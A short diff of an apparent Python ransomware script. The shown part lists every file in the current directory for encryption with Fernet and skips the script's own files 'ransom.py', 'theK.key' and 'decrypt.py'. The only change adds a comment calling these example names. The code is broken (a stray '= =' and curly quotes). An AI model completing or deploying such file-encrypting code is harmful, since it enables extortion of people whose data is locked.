@@ -13,7 +13,7 @@ from cryptography.fernet import Fernet
 #Find all files in the directory to encrypt them and add them to a list.
 files = []                              
 for file in os.listdir():   
-    if file = = “ransom.py” or file == “theK.key” or file == “decrypt.py” :
+    if file = = “ransom.py” or file == “theK.key” or file == “decrypt.py” : # these are example file names 
          continue
     if os.path.isfile(file):
         files.append(file)
